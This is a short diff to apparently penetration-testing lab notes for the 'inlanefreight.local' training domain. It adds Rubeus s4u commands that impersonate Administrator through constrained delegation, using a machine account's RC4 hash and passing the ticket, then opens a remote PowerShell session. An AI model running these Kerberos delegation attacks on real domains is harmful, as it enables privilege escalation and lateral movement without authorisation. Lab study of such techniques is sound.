@@ -109,6 +109,10 @@ Get-DomainComputer -TrustedToAuth
 ```
 ```powershell
 .\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt
+
+.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:wsman /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt
+
+.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:host /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt
 ```
 ```powershell
 Enter-PSSession ws01.inlanefreight.local
